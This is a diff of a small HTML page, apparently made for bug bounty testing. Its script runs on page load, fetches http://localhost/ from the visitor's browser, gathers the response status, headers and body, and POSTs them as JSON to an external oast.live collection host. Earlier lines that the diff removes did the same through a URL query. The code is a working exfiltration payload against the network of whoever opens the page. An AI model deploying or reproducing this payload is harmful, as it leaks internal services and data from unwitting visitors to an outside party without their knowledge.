@@ -1,29 +1,58 @@
 <html>
-  <h1>hello here</h1><br>
+  <h1>Hello here , just test for bug bounty :) </h1><br>
  <body>
   <div id="result"></div>
   <div id="result1"></div>
   
   <script>
-    //fetch("https://d9scd2amruon0ebkphg0wfq9f7agpwb5u.oast.pro/")
-      //.then(r => r.text())
-      //.then(data => {
-        //document.getElementById("result").innerHTML = data;
-     // })
-    //  .catch(err => {
-    //    document.getElementById("result").textContent = err;
-    //  });
+  fetch("http://localhost/")
+  .then(async r => {
+    const body = await r.text();
 
-    fetch("http://localhost/")
-      .then(r => r.text())
-      .then(data => {
-        document.getElementById("result1").innerHTML = data;
-        fetch(`https://d9sckgqmruop20uqj8q0pp5rnwyqjn118.oast.live/?res=${data}`)
-      })
-      .catch(err => {
-        document.getElementById("result1").textContent = err;
-         fetch(`https://d9sckgqmruop20uqj8q0pp5rnwyqjn118.oast.live/?res=${err}`)
-      });
+    const headers = {};
+    for (const [key, value] of r.headers.entries()) {
+      headers[key] = value;
+    }
+
+    const responseData = {
+      status: r.status,
+      statusText: r.statusText,
+      url: r.url,
+      redirected: r.redirected,
+      headers: headers,
+      body: body
+    };
+
+    document.getElementById("result1").textContent =
+      JSON.stringify(responseData, null, 2);
+
+    fetch("https://d9scv62mruosdl6tl2n0yisugu31dwoow.oast.live/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(responseData)
+    });
+  })
+  .catch(async err => {
+    const errorData = {
+      error: String(err),
+      message: err?.message || null,
+      stack: err?.stack || null
+    };
+
+    document.getElementById("result1").textContent =
+      JSON.stringify(errorData, null, 2);
+
+    fetch("https://d9scv62mruosdl6tl2n0yisugu31dwoow.oast.live/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(errorData)
+    }).catch(() => {});
+  });
+    
   </script>
 
     
